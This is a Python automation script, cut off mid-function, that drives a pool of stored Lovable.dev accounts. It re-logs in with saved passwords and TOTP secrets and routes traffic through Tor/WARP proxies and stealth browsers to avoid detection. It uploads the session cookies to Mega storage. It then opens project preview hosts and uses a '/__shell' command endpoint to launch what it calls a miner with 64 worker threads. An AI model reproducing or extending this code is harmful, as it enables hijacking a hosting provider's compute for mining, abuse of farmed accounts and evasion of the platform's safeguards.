#!/usr/bin/env python3
"""
Script 3: Session Runner
Load session → Connect → Start worker → Health check

Usage:
  python3 script3_launch_miner.py --session 3 --mode oneshot
  python3 script3_launch_miner.py --session 3 --mode full
  python3 script3_launch_miner.py --session 3 --mode gh
  python3 script3_launch_miner.py --session 3 --mode full --warp
"""

import asyncio
import argparse
import json
import os
import sys
from pathlib import Path

# Add paths (env-configurable for CI runners)
TOOLKIT_CORE = os.environ.get(
    "CHIMERA_TOOLKIT_CORE", "/home/alae/Documents/repos/automation-toolkit/finals/core"
)
sys.path.insert(0, TOOLKIT_CORE)
sys.path.insert(0, str(Path(__file__).resolve().parent))

from invisible_playwright.async_api import InvisiblePlaywright
from mega_db import load_db, save_db, mega_distributed_lock
from miner_injector import inject_miner, health_check_loop

SESSIONS_DIR = Path(
    os.environ.get(
        "CHIMERA_SESSIONS_DIR",
        "/home/alae/Documents/repos/automation-toolkit/scripts/sessions",
    )
)
BRIDGE_URL = "wss://chimera-bridge-production-0ef2.up.railway.app"

LOGIN_URL = "https://lovable.dev/login"
DASHBOARD_MARKERS = ["/projects", "/dashboard"]


def resolve_proxy() -> dict | None:
    """HTTP_PROXY_URL (http://user:pass@host:port) first, else TOR->WARP chain scan."""
    import socket
    from urllib.parse import urlparse, unquote
    hp = os.environ.get("HTTP_PROXY_URL", "").strip()
    if hp:
        p = urlparse(hp)
        d = {"server": f"{p.scheme}://{p.hostname}:{p.port}"}
        if p.username:
            d["username"] = unquote(p.username)
        if p.password:
            d["password"] = unquote(p.password)
        print(f"✅ Using HTTP proxy {p.hostname}:{p.port}", file=sys.stderr)
        return d
    # ponytail: NO_PROXY_CHAIN=1 forces direct (stale listeners accept TCP but don't route).
    if os.environ.get("NO_PROXY_CHAIN", ""):
        print("⚠️  Proxy chain disabled (NO_PROXY_CHAIN); direct connection.", file=sys.stderr)
        return None
    forced = os.environ.get("PROXY_PORT")
    ports = [int(forced)] if forced else [9051, 9052, 9053, 9054, 9050, 40000]
    for port in ports:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=2):
                proxy = {"server": f"socks5://127.0.0.1:{port}"}
                print(f"✅ Using proxy 127.0.0.1:{port}", file=sys.stderr)
                return proxy
        except OSError:
            continue
    print("⚠️  No proxy found (TOR/WARP not running); direct connection.", file=sys.stderr)
    return None


async def mark_truly_red(session_id: str, session_key: str, config: dict, reason: str):
    """Flag a session as truly_red in both config.json and the Mega DB."""
    print(f"\n💀 Session bounced out of dashboard - marking TRULY RED ({reason})")
    try:
        config["status"] = "truly_red"
        config["flag_reason"] = reason
        with open(SESSIONS_DIR / f"session-{session_id}" / "config.json", "w") as f:
            json.dump(config, f, indent=2)
    except Exception as e:
        print(f"⚠️  Failed to write config.json: {e}")
    try:
        with mega_distributed_lock(timeout=600):
            db = load_db()
            if db.get_session(session_key):
                db.update_session(session_key, status="truly_red", flag_reason=reason)
            save_db(db)
    except Exception as e:
        print(f"⚠️  Failed to flag truly_red in DB: {e}")


async def relogin_session(browser, config: dict, session_id: str) -> str:
    """Attempt normal email+password login in a FRESH context (mirrors script2/revive).

    On success, overwrites the session's cookies.json with fresh cookies.
    Returns: "ok" (logged in + cookies saved), "lost" (invalid credentials - account dead),
             "failed" (other error)
    """
    email = config.get("email", "")
    password = config.get("password", email)

    context = await browser.new_context()
    page = await context.new_page()

    LOST_SELECTORS = [
        '[data-slot="field-error"]',
        '[id$="-form-item-message"]',
        '.ant-form-item-explain-error',
        'text=The provided credentials are invalid',
        'text=Invalid email or password',
        'text=Incorrect password',
        'text=Wrong email or password',
        'text=Invalid credentials',
    ]

    async def check_lost() -> bool:
        for selector in LOST_SELECTORS:
            try:
                el = await page.wait_for_selector(selector, timeout=2500)
                if el and await el.is_visible():
                    print(f"   ⚠️  INVALID CREDENTIALS error shown ({selector})")
                    return True
            except:
                continue
        return False

    async def save_fresh_cookies():
        cookies = await context.cookies()
        session_path = SESSIONS_DIR / f"session-{session_id}"
        with open(session_path / "cookies.json", "w") as f:
            json.dump(cookies, f, indent=2)
        print(f"   ✅ Cookies overwritten ({len(cookies)} cookies)")
        if not os.environ.get("CHIMERA_OFFLINE", ""):
            try:
                import subprocess
                proxy_vars = ["http_proxy", "https_proxy", "all_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "no_proxy", "NO_PROXY"]
                env = {k: v for k, v in os.environ.items() if k not in proxy_vars}
                remote = f"mega:lovable_sessions/session-{session_id}/cookies.json"
                res = subprocess.run(
                    ["rclone", "copyto", str(session_path / "cookies.json"), remote],
                    capture_output=True, text=True, timeout=60, env=env,
                )
                if res.returncode == 0:
                    print(f"   ✅ Cookies uploaded to Mega ({remote})")
                else:
                    print(f"   ⚠️  Mega cookies upload failed: {res.stderr[:200]}")
            except Exception as e:
                print(f"   ⚠️  Mega cookies upload error: {e}")

    try:
        print(f"   🌐 Re-login: opening {LOGIN_URL}")
        await page.goto(LOGIN_URL, timeout=60000)
        await page.wait_for_load_state("domcontentloaded", timeout=30000)
        await asyncio.sleep(4)

        # Already logged in?
        if any(m in page.url for m in DASHBOARD_MARKERS):
            print("   ✅ Already logged in")
            await save_fresh_cookies()
            return "ok"

        # Find email input
        email_input = None
        for selector in ['input[type="email"]', 'input[name="email"]', 'input[autocomplete="email"]', 'input[placeholder*="mail"]']:
            try:
                email_input = await page.wait_for_selector(selector, timeout=8000, state="visible")
                if email_input:
                    break
            except:
                continue

        if not email_input:
            print("   ❌ Email input not found")
            return "failed"

        print(f"   📧 Filling email: {email}")
        await email_input.fill(email)
        await asyncio.sleep(0.5)

        # Click Continue / Sign in (first step) - EXACT match, never the Google button
        for btn_text in ["Continue", "Sign in", "Sign In", "Login", "Next"]:
            try:
                btn = page.get_by_role("button", name=btn_text, exact=True).first
                if await btn.is_visible():
                    await btn.click()
                    print(f"   🖱️  Clicked '{btn_text}'")
                    break
            except:
                continue
        else:
            print("   ⌨️  No exact button found - pressing Enter on email field")
            await email_input.press("Enter")

        await asyncio.sleep(3)

        # Find password input (some flows reveal it after email step)
        password_input = None
        for selector in ['input[type="password"]', 'input[name="password"]', 'input[autocomplete="current-password"]']:
            try:
                password_input = await page.wait_for_selector(selector, timeout=10000, state="visible")
                if password_input:
                    break
            except:
                continue

        if not password_input:
            if any(m in page.url for m in DASHBOARD_MARKERS):
                print("   ✅ Logged in after email step")
                await save_fresh_cookies()
                return "ok"
            print("   ❌ Password input not found")
            return "failed"

        print(f"   🔑 Filling password")
        await password_input.fill(password)
        await asyncio.sleep(0.5)

        for btn_text in ["Sign in", "Sign In", "Login", "Log in", "Continue", "Submit"]:
            try:
                btn = page.get_by_role("button", name=btn_text, exact=True).first
                if await btn.is_visible():
                    await btn.click()
                    print(f"   🖱️  Clicked '{btn_text}'")
                    break
            except:
                continue
        else:
            print("   ⌨️  No exact button found - pressing Enter on password field")
            await password_input.press("Enter")

        # 2FA: if Lovable asks for an authenticator code, fill TOTP from config
        # (mirrors finals/core lov-session-refresh-totp.py flow).
        await asyncio.sleep(6)
        try:
            body_txt = await page.evaluate("() => document.body.innerText.slice(0, 800)")
        except Exception:
            body_txt = ""
        if any(k in body_txt.lower() for k in ("verification code", "two-factor", "authenticator")):
            print("   🔢 2FA code requested")
            secrets = [s for s in (config.get("totp_secret", ""), config.get("totp_secret_backup", "")) if s]
            if not secrets:
                print("   ❌ 2FA required but no totp_secret in config")
                return "failed"
            try:
                import pyotp
            except ImportError:
                print("   ❌ 2FA required but pyotp not installed (pip install pyotp)")
                return "failed"
            filled = False
            for sec in secrets:
                code = pyotp.TOTP(sec).now()
                try:
                    inp = page.locator('input[inputmode="numeric"], input[autocomplete="one-time-code"], input[type="text"], input:not([type])').first
                    await inp.wait_for(state="visible", timeout=8000)
                    await inp.fill(code)
                    filled = True
                    break
                except Exception:
                    try:
                        await page.evaluate("""(code) => {
                            const el = document.querySelector('#totp-code') || [...document.querySelectorAll('input')].find(i=>/code|token|otp|auth/i.test((i.placeholder||'')+(i.name||'')+(i.id||''))) || [...document.querySelectorAll('input')].find(i=>i.offsetParent!==null);
                            if(!el) throw new Error('no totp input found');
                            el.focus();
                            document.execCommand('selectAll', false, null);
                            document.execCommand('insertText', false, code); }""", code)
                        filled = True
                        break
                    except Exception as e:
                        print(f"   ⚠️  TOTP fill failed with this secret: {e}")
                        continue
            if not filled:
                print("   ❌ 2FA code input not found")
                return "failed"
            print("   ✅ TOTP code filled")
            await asyncio.sleep(1)
            try:
                await page.get_by_role("button", name="Verify").click(timeout=5000)
                print("   🖱️  Clicked 'Verify'")
            except Exception:
                try:
                    vbtn = page.locator('[data-testid="auth-submit-button"]')
                    if await vbtn.is_visible():
                        await vbtn.click()
                        print("   🖱️  Clicked auth-submit")
                except Exception:
                    pass
            await asyncio.sleep(6)

        # Wait for dashboard (up to 90s), checking for invalid-credentials errors
        print("   ⏳ Waiting for dashboard...")
        for _ in range(18):
            await asyncio.sleep(5)
            if await check_lost():
                print("   💀 Account is LOST (invalid credentials)")
                return "lost"
            if any(m in page.url for m in DASHBOARD_MARKERS):
                print("   ✅ Logged in!")
                await save_fresh_cookies()
                return "ok"

        print("   ❌ Re-login did not reach dashboard")
        return "failed"

    except Exception as e:
        print(f"   ❌ Re-login error: {e}")
        return "failed"
    finally:
        try:
            await page.close()
        except:
            pass
        try:
            await context.close()
        except:
            pass


async def load_session_cookies(session_id: str):
    """Load session cookies from disk."""
    session_path = SESSIONS_DIR / f"session-{session_id}"
    
    if not session_path.exists():
        raise FileNotFoundError(f"Session session-{session_id} not found")
    
    with open(session_path / "config.json") as f:
        config = json.load(f)
    
    with open(session_path / "cookies.json") as f:
        cookies = json.load(f)
    
    return config, cookies


async def accept_invite(page, invite_link: str) -> bool:
    """Accept project invitation."""
    try:
        print(f"📨 Accepting invite: {invite_link}")
        await page.goto(invite_link, timeout=30000)
        await asyncio.sleep(3)
        
        # Look for accept button
        accept_selectors = [
            'button:has-text("Accept")',
            'button:has-text("Join")',
            'button:has-text("Continue")',
            '[role="button"]:has-text("Accept")'
        ]
        
        for selector in accept_selectors:
            try:
                button = await page.wait_for_selector(selector, timeout=5000)
                if button:
                    await button.click()
                    print("✅ Clicked accept button")
                    await asyncio.sleep(3)
                    return True
            except:
                continue
        
        # If no button found, might already be accepted
        if "projects/" in page.url:
            print("✅ Already accepted or no button needed")
            return True
        
        print("⚠️  Could not find accept button, but continuing...")
        return True
        
    except Exception as e:
        print(f"❌ Accept invite failed: {e}")
        return False


async def goto_retry(page, url, timeout_ms=30000, tries=3, wait_until="load"):
    """goto with retries - Tor/WARP links drop page loads; an unhandled
    timeout used to kill the whole session run.

    NS_BINDING_ABORTED often means auth-bridge redirected mid-goto — treat as
    OK if we already landed on lovableproject / auth-bridge / auth-token.
    """
    for attempt in range(1, tries + 1):
        try:
            await page.goto(url, timeout=timeout_ms, wait_until=wait_until)
            return True
        except Exception as e:
            msg = str(e)
            cur = ""
            try:
                cur = page.url or ""
            except Exception:
                pass
            aborted = "NS_BINDING_ABORTED" in msg or "ERR_ABORTED" in msg or "Navigation interrupted" in msg
            landed = any(
                x in cur
                for x in ("lovableproject.com", "auth-bridge", "auth-token", "lovable.dev")
            )
            if aborted and landed:
                print(f"   ↪️  goto aborted but landed on {cur[:100]} — continuing")
                return True
            print(f"   ⚠️  goto failed (attempt {attempt}/{tries}): {e}")
            if attempt == tries:
                raise
            await asyncio.sleep(5 * attempt)
    return False


async def wait_for_bridge(page, tries=100) -> bool:
    """Poll the (sync, hang-free) URL until preview leaves auth-bridge."""
    for i in range(tries):
        await asyncio.sleep(3)
        try:
            if "auth-bridge" not in page.url:
                print(f"   🌉 bridge resolved -> {page.url[:100]}")
                return True
        except Exception:
            return False
    print("   ⚠️ bridge still on auth-bridge after ~5min, probing anyway")
    return False


def _is_preview_target_url(url: str) -> bool:
    """True only for real preview origins — not api.lovable.dev?...lovableproject.com=..."""
    u = (url or "").split("?", 1)[0].lower()
    if not u.startswith("http"):
        return False
    return (
        "lovableproject.com" in u
        or "webcontainer" in u
        or u.startswith("https://lovable-")
    )


def _preview_url_score(url: str) -> int:
    """Prefer tokenized / webcontainer URLs over bare project domain."""
    u = url or ""
    score = len(u)
    if "?" in u:
        score += 1000
    if "token" in u.lower():
        score += 500
    if "webcontainer" in u.lower():
        score += 800
    return score


def _shell_js(cmd: str, cwd: str | None = None) -> str:
    payload = json.dumps({"cmd": cmd, "cwd": cwd})
    payload_escaped = payload.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${")
    return f"""async () => {{
        const body = `{payload_escaped}`;
        const r = await fetch('/__shell', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: body
        }});
        const text = await r.text();
        try {{ return JSON.parse(text); }}
        catch (e) {{
            return {{code: -1, stdout: '', stderr: 'non-json HTTP ' + r.status + ': ' + text.slice(0, 160), cwd: ''}};
        }}
    }}"""


async def steal_preview_url(page, timeout_s: int = 180, captured: list[str] | None = None) -> str | None:
    """Steal preview URL via Playwright frames + optional network capture list.

    Camoufox has no Chromium CDP. DOM evaluate on the Lovable chat SPA wedges.
    Prefer URLs observed via request/response/framenavigated hooks.
    """
    best = None
    seen_same = 0
    last_best = None
    deadline = asyncio.get_event_loop().time() + timeout_s
    tick = 0
    while asyncio.get_event_loop().time() < deadline:
        tick += 1
        candidates: list[str] = []
        if captured:
            candidates.extend(captured)
        try:
            for f in page.frames:
                u = f.url or ""
                if _is_preview_target_url(u):
                    candidates.append(u)
                elif tick == 1 or tick % 6 == 0:
                    if u and u not in ("about:blank", "about:srcdoc") and "lovable.dev" not in u:
                        print(f"   · other frame: {u[:100]}")
        except Exception as e:
            print(f"   ⚠️ frames read: {type(e).__name__}: {e}")

        # dedupe preserve order
        seen = set()
        uniq = []
        for u in candidates:
            if u not in seen:
                seen.add(u)
                uniq.append(u)
        candidates = uniq

        for u in candidates:
            if best is None or _preview_url_score(u) > _preview_url_score(best):
                best = u

        if candidates:
            rich = best and (
                "?" in best
                or "token" in best.lower()
                or "webcontainer" in best.lower()
            )
            if rich:
                print(f"   🎯 preview frame: {best[:150]}")
                return best
            if best == last_best:
                seen_same += 1
            else:
                seen_same = 1
                last_best = best
            print(f"   ⏳ preview candidates (stable={seen_same}): {[u[:100] for u in candidates[:4]]}")
            if seen_same >= 2:
                print(f"   🎯 stable preview frame: {best[:150]}")
                return best
        else:
            seen_same = 0
            last_best = None
            if tick == 1 or tick % 3 == 0:
                nframes = 0
                try:
                    nframes = len(page.frames)
                except Exception:
                    pass
                print(f"   ⏳ waiting for preview frame... ({tick}, frames={nframes}, captured={len(captured or [])})")
        await asyncio.sleep(5)

    if best:
        print(f"   ⚠️ steal timed out; best candidate: {best[:150]}")
        return best
    print("   ❌ no preview frame found")
    return None


async def soft_wake_preview(page) -> None:
    """Force Lovable to mount the preview iframe.

    Prefer commit-nav to /preview (no chat typing). Keyboard wake is
    best-effort and hard-timed — mouse/keyboard can hang forever under
    Camoufox+proxy even when they usually work blind.
    """
    pid = None
    try:
        u = page.url or ""
        if "/projects/" in u:
            pid = u.split("/projects/")[1].split("/")[0].split("?")[0]
    except Exception:
        pid = None

    if pid:
        panel = f"https://lovable.dev/projects/{pid}/preview"
        print(f"   ⚡ soft-wake: commit-nav to {panel}")
        try:
            await asyncio.wait_for(
                page.goto(panel, timeout=60000, wait_until="commit"),
                timeout=70,
            )
            await asyncio.sleep(20)
            print(f"   🌐 after commit-nav: {page.url} frames={len(page.frames)}")
        except Exception as e:
            print(f"   ⚠️ commit-nav failed ({type(e).__name__}): {e}")

    print("   ⚡ soft-wake: timed keyboard nudge (20s cap)...")
    try:
        await asyncio.wait_for(page.mouse.click(200, 560), timeout=10)
        await asyncio.sleep(0.5)
        await asyncio.wait_for(page.keyboard.type("say 'a'", delay=15), timeout=20)
        await asyncio.wait_for(page.keyboard.press("Enter"), timeout=10)
        print("   ✅ soft-wake prompt sent")
        await asyncio.sleep(20)
    except Exception as e:
        print(f"   ⚠️ soft-wake keyboard skipped ({type(e).__name__}): {e}")




async def shell_exec_preview(page, cmd: str, cwd: str | None = None, skip_main: bool = False) -> dict:
    """Probe /__shell on the page and every frame (preview frame holds Vite).

    skip_main=True when on Lovable chat SPA — main-frame evaluate wedges behind
    the busy main thread; only child frames (preview) are useful.
    """
    js = _shell_js(cmd, cwd)
    errors = []
    if not skip_main:
        try:
            r = await asyncio.wait_for(page.evaluate(js), timeout=30)
            if isinstance(r, dict) and r.get("code") == 0:
                return r
            if isinstance(r, dict):
                errors.append(f"page:{r.get('stderr') or r}")
        except Exception as e:
            errors.append(f"page:{type(e).__name__}:{e}")

    frames = list(page.frames)
    print(f"   🧩 probing {len(frames)} frames for /__shell...")
    for i, frame in enumerate(frames):
        url = ""
        try:
            url = frame.url or ""
        except Exception:
            url = "?"
        # Skip pure chat/lovable.dev parent when we already know it wedges
        if skip_main and "lovable.dev" in url and "lovableproject" not in url:
            continue
        try:
            print(f"   · frame[{i}] {url[:100] or '(blank)'}")
            r = await asyncio.wait_for(frame.evaluate(js), timeout=45)
            if isinstance(r, dict) and r.get("code") == 0:
                print(f"   ✅ shell via frame[{i}] {url[:80]}")
                return r
            if isinstance(r, dict):
                err = r.get("stderr") or str(r)
                errors.append(f"frame[{i}]({url[:60]}):{err}")
                print(f"   ⚠️ frame[{i}] shell: {err[:120]}")
        except Exception as e:
            errors.append(f"frame[{i}]:{type(e).__name__}")
            print(f"   ⚠️ frame[{i}] err: {type(e).__name__}")
    raise RuntimeError(" | ".join(errors[:6]) or "shell failed on all frames")



async def check_session_valid(page) -> bool:
    """Check if session is still valid (not expired)."""
    try:
        current_url = page.url
        
        # If redirected to login/auth, session is expired
        if "login" in current_url or "auth" in current_url:
            return False
        
        return True
    except:
        return False


async def wait_for_console_message(page, timeout_seconds=300, miner_cmd=None):
    """Wait for shell bridge to be ready, then execute miner_cmd via /__shell."""
    from miner_injector import shell_exec
    print(f"⏳ Probing shell bridge (max {timeout_seconds}s)...")

    start_time = asyncio.get_event_loop().time()
    refresh_interval = 40

    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed > timeout_seconds:
            print(f"⚠️  Timeout waiting for shell bridge after {timeout_seconds}s")
            return False

        # Directly probe /__shell — no window.doc needed
        if miner_cmd:
            try:
                r = await shell_exec(page, "pwd")
                if r and r.get("code") == 0:
                    print(f"✅ Shell bridge ready (after {int(elapsed)}s)")
                    return True
                else:
                    print(f"   ⏳ Shell returned code {r.get('code')} ({int(elapsed)}s)")
            except Exception as e:
                print(f"   ⚠️  Shell probe error ({int(elapsed)}s): {e}")

        # Refresh page
        print(f"   🔄 Refreshing page... ({int(elapsed)}s elapsed)")
        try:
            await page.reload(timeout=30000)
            await asyncio.sleep(5)
        except Exception as e:
            print(f"   ⚠️  Refresh error: {e}")

        await asyncio.sleep(refresh_interval)


async def verify_session_projects(session_id: int, db):
    """Open every project's chat link with this session's cookies and stamp linked=true/false."""
    session_key = f"session-{session_id}"
    projects = [p for p in db.data["projects"] if p.get("created_by") == session_key]
    
    if not projects:
        print(f"❌ No projects found for {session_key}")
        return
    
    print(f"\n🔍 Verifying {len(projects)} projects for {session_key}...")
    
    config, cookies = await load_session_cookies(session_id)
    
    proxy = resolve_proxy()
    async with InvisiblePlaywright(
        headless=False,
        proxy=proxy,
        humanize=True,
        locale='en-US',
    ) as browser:
        context = browser.contexts[0] if browser.contexts else await browser.new_context()
        await context.add_cookies(cookies)
        
        chat_selectors = [
            'div[contenteditable="true"][role="textbox"]',
            '[contenteditable="true"]',
            'textarea[placeholder*="chat"]',
            'textarea',
        ]
        
        for p in projects:
            url = p.get("chat_url") or f"https://lovable.dev/projects/{p['project_id']}"
            print(f"\n🔍 {p['project_id']} ({p.get('mode')}) → {url}")
            page = await context.new_page()
            try:
                await page.goto(url, timeout=30000)
                await asyncio.sleep(5)
                
                if "login" in page.url.lower() or "auth" in page.url.lower():
                    print(f"   ❌ LOGIN REDIRECT - session expired")
                    p["linked"] = False
                    db.mark_session_red(session_key)
                else:
                    found = False
                    for selector in chat_selectors:
                        try:
                            el = await page.wait_for_selector(selector, timeout=8000, state='visible')
                            if el and await el.is_visible():
                                found = True
                                break
                        except:
                            continue
                    p["linked"] = found
                    print(f"   {'✅ LINKED (chat editor found)' if found else '❌ NOT LINKED (no chat editor)'}")
            except Exception as e:
                p["linked"] = False
                print(f"   ❌ Error: {e}")
            await page.close()
    
    save_db(db)
    print("\n=== VERIFICATION RESULTS ===")
    for p in projects:
        print(f"  {p['project_id']}: linked={p.get('linked')} mode={p.get('mode')}")


async def main():
    parser = argparse.ArgumentParser(description="Script 3: Session Runner")
    parser.add_argument("--session", type=str, required=True, help="Session number or ID (3, session-3, or 31959887265-1-1786899376)")
    parser.add_argument("--mode", choices=["oneshot", "full", "gh", "verify"], default="full", help="Health check mode (gh = stop after 4h40m-5h30m, verify = stamp linked projects)")
    parser.add_argument("--warp", action="store_true", help="Use WARP proxy (not implemented yet)")
    parser.add_argument("--project", help="Optional: specify project ID to use")
    parser.add_argument("--threads", type=int, default=64, help="Worker threads (default: 64)")
    
    args = parser.parse_args()
    
    # Normalize session: strip optional "session-" prefix so both "3" and
    # "session-3" and GH-style "31959887265-1-1786899376" all work.
    args.session = args.session.strip()
    if args.session.startswith("session-"):
        args.session = args.session[len("session-"):]
    if not args.session:
        parser.error("empty session ID")
    
    print("=" * 60)
    print("🚀 SCRIPT 3: SESSION RUNNER")
    print("=" * 60)
    print(f"Session: session-{args.session}")
    print(f"Mode: {args.mode}")
    print(f"WARP: {'Yes' if args.warp else 'No'}")
    print(f"Threads: {args.threads}")
    print("=" * 60 + "\n")
    
    # 1. Load Mega DB
    print("📥 Loading Mega database...")
    db = load_db()
    db.print_stats()
    
    if args.mode == "verify":
        await verify_session_projects(args.session, db)
        return
    
    # 2. Get session
    session_id = f"session-{args.session}"
    session = db.get_session(session_id)
    
    if not session:
        print(f"⚠️  Session {session_id} not in database, checking disk...")
        try:
            config, cookies = await load_session_cookies(args.session)
            email = config.get("email", "unknown")
            print(f"✅ Found session on disk: {email}")
            
            # Add to database
            db.add_session(session_id, email, "active")
            session = db.get_session(session_id)
        except Exception as e:
            print(f"❌ Session {session_id} not found: {e}")
            return
    
    if session.get("status") in ("red", "truly_red"):
        print(f"❌ Session {session_id} is FLAGGED ({session.get('status')})")
        print("   Skipping...")
        return
    
    print(f"✅ Session: {session['email']} (status: {session['status']})")
    
    # 3. Get project owned by this session (lowest usage)
    if args.project:
        project = db.get_project(args.project)
        if not project:
            print(f"❌ Project {args.project} not found in database")
            return
        # Verify ownership
        if project.get("created_by") != session_id:
            print(f"⚠️  Warning: Project {args.project} was created by {project.get('created_by')}, not {session_id}")
    else:
        # Get project linked to THIS account (template-created, not external invites)
        project = db.get_account_linked_project(session_id)
        if not project:
            print(f"❌ No account-linked projects for {session_id}")
            print(f"   Create projects first: python3 script2_remix_link.py --session {args.session} --count 3")
            return
    
    print(f"✅ Using project: {project['project_id']}")
    print(f"   Created by: {project.get('created_by')}")
    print(f"   Usage: {project['usage_count']}/{project['max_usage']}")
    
    # 4. Mark account ON_HOLD (no usage increment - prevents concurrent use of the account)
    prev_status = session.get("status", "active")
    db.update_session(session_id, status="on_hold")
    
    save_db(db)
    
    # 5. Load session cookies
    print(f"\n📂 Loading session cookies...")
    try:
        config, cookies = await load_session_cookies(args.session)
    except Exception as e:
        print(f"❌ Failed to load session: {e}")
        db.mark_session_red(session_id)
        save_db(db)
        return
    
    # 6. Start browser
    print("\n🌐 Starting browser...")
    
    try:
        proxy = resolve_proxy()
        # ponytail: CAMOUFOX=1 swaps the stealth engine; default stays InvisiblePlaywright.
        # HEADED=1 runs headful (needs X/DISPLAY or xvfb-run).
        headless = not os.environ.get("HEADED", "")
        if os.environ.get("CAMOUFOX", ""):
            from camoufox.async_api import AsyncCamoufox
            print(f"🦊 Browser engine: Camoufox (headless={headless})")
            # ponytail: squeeze Camoufox into 1GB sandbox — block images/webrtc/webgl,
            # disable cache, set Firefox memory limits, tiny viewport.
            browser_cm = AsyncCamoufox(
                headless=headless,
                proxy=proxy,
                block_webrtc=True,
                block_webgl=True,
                enable_cache=False,
                window=(800, 600),
                args=[
                    "--no-zygote",
                    "--disable-gpu",
                    "--disable-dev-shm-usage",
                ],
                firefox_user_prefs={
                    "browser.cache.disk.enable": False,
                    "browser.cache.memory.enable": False,
                    "browser.cache.offline.enable": False,
                    "dom.ipc.processCount": 1,
                    "dom.ipc.processCount.perIsolate": 1,
                    "media.memory_cache_max_size": 0,
                    "image.mem.decode_bytes_at_a_time": 0,
                },
            )
        else:
            # minimal for weak 1GB sandbox: headless True + no humanize + small viewport
            browser_cm = InvisiblePlaywright(
                headless=headless,
                proxy=proxy,
                humanize=False,
                locale='en-US',
            )
        async with browser_cm as browser:
            # ponytail: never pass an explicit viewport — a viewport that can't
            # fit the spoofed window geometry deadlocks the Juggler handshake
            # with NO timeout (upstream #666/#673). no_viewport measures instead.
            context = browser.contexts[0] if browser.contexts else await browser.new_context(no_viewport=True)
            
            # Create chat page
            chat_page = await context.new_page()
            await context.add_cookies(cookies)

            # Camoufox frame tree often stays at 1 frame even when Preview
            # loads — capture lovableproject/webcontainer URLs from network
            # + framenavigated (Firefox-safe; no CDP).
            captured_preview_urls: list[str] = []

            def _capture_url(u: str, src: str):
                if not u or not _is_preview_target_url(u):
                    return
                if u not in captured_preview_urls:
                    captured_preview_urls.append(u)
                    print(f"   📡 {src}: {u[:140]}")

            def _on_request(request):
                try:
                    _capture_url(request.url or "", "req")
                except Exception:
                    pass

            def _on_response(response):
                try:
                    _capture_url(response.url or "", "resp")
                except Exception:
                    pass

            def _on_frame(frame):
                try:
                    _capture_url(frame.url or "", "frame")
                except Exception:
                    pass

            chat_page.on("request", _on_request)
            chat_page.on("response", _on_response)
            chat_page.on("framenavigated", _on_frame)
            # ponytail: SKIP_CHAT=1 — warm session on lovable.dev, then go
            # straight to *.lovableproject.com (local proof: /__shell works there).
            # Do NOT use /preview panel or iframe steal.
            skip_chat = bool(os.environ.get("SKIP_CHAT", ""))
            if skip_chat:
                print("\n⏩ SKIP_CHAT=1 — warm cookies, then *.lovableproject.com")

            
            # 7. Session check via chat (or dashboard). Under SKIP_CHAT we leave
            # quickly for the preview host.
            chat_url = project.get("chat_url", f"https://lovable.dev/projects/{project['project_id']}")
            print(f"\n📝 Going to chat: {chat_url}")
            await goto_retry(chat_page, chat_url)
            await asyncio.sleep(3 if skip_chat else 8)
            print(f"🌐 Page URL: {chat_page.url}")
            if not skip_chat:
                try:
                    # ponytail: reads can wedge behind a busy SPA main thread —
                    # never let a diagnostic block the run; input pipeline works blind.
                    _t = await asyncio.wait_for(chat_page.title(), timeout=30)
                    print(f"🌐 Page title: {_t}")
                except Exception as e:
                    print(f"⚠️ title skipped ({type(e).__name__}), continuing blind")

            # Check if session is valid
            relogin_done = False
            if not await check_session_valid(chat_page):
                print("🔑 Session expired (redirected to login) - attempting re-login with stored credentials...")
                cfg = config
                cfg.setdefault("session_id", args.session)
                result = await relogin_session(browser, cfg, args.session)
                relogin_done = True
                if result == "ok":
                    print("✅ Re-login OK - retrying chat with fresh cookies")
                    fresh = json.load(open(SESSIONS_DIR / f"session-{args.session}" / "cookies.json"))
                    try:
                        await context.clear_cookies()
                    except:
                        pass
                    await context.add_cookies(fresh)
                    await goto_retry(chat_page, chat_url)
                    await asyncio.sleep(2)
                    if not await check_session_valid(chat_page):
                        print("❌ Still redirected to login after re-login")
                        await mark_truly_red(args.session, session_id, cfg,
                                             "redirected to login after successful re-login")
                        return
                else:
                    reason = "invalid credentials - account lost" if result == "lost" else f"re-login failed ({result})"
                    await mark_truly_red(args.session, session_id, cfg, reason)
                    return
            
            # 8. Send prompt — bypass element-finding entirely.
            # Camoufox CDP timeouts hang through proxy, so we click the
            # page to focus it, then type directly via keyboard.
            import random
            simple_prompts = ["say 'a'", "1+1?", "say 'x'", "2+2?"]
            prompt = random.choice(simple_prompts) if not skip_chat else "(skipped)"
            
            print(f"💬 Sending prompt: '{prompt}'")
            if skip_chat:
                print("   ⏩ SKIP_CHAT — prompt NOT sent")
            else:
                # ponytail: all Playwright locators hang through Camoufox+proxy CDP.
                # Raw mouse click at coordinates + keyboard is the only reliable path.
                await chat_page.mouse.click(200, 560)
                await asyncio.sleep(1)
                try:
                    await chat_page.keyboard.type(prompt, delay=20)
                    await asyncio.sleep(0.3)
                    await chat_page.keyboard.press("Enter")
                    print("✅ Prompt sent!")
                except Exception as e:
                    print(f"⚠️ Keyboard type failed: {e}")
                    return
            # ponytail: screenshots wedge the Camoufox driver pipe on proxied
            # boxes (proven by probe) — URL print instead, never screenshot.
            print(f"🌐 chat URL now: {chat_page.url}")
            
            # 9. Open *.lovableproject.com (NOT /preview). Local InvisiblePlaywright
            # proved /__shell returns 200 here after auth-bridge. In-place nav
            # (no 2nd tab) under SKIP_CHAT.
            print("\n🖼️  Opening *.lovableproject.com ...")
            preview_url = f"https://{project['project_id']}.lovableproject.com"
            # ignore DB preview_url if it points at lovable.dev/.../preview
            db_prev = (project.get("preview_url") or "")
            if "lovableproject.com" in db_prev.split("?", 1)[0]:
                preview_url = db_prev.split("?", 1)[0].rstrip("/") or preview_url
            preview_page = chat_page if skip_chat else None

            async def _open_preview(page):
                print(f"   📄 goto {preview_url}")
                # commit: auth-bridge redirects abort domcontentloaded (NS_BINDING_ABORTED)
                await goto_retry(page, preview_url, timeout_ms=120000, wait_until="commit")
                await asyncio.sleep(5)
                await wait_for_bridge(page)
                print(f"   🌐 after bridge: {page.url}")

            try:
                if skip_chat:
                    print("   ⏩ SKIP_CHAT — in-place nav to *.lovableproject.com (no 2nd tab)")
                    await _open_preview(preview_page)
                else:
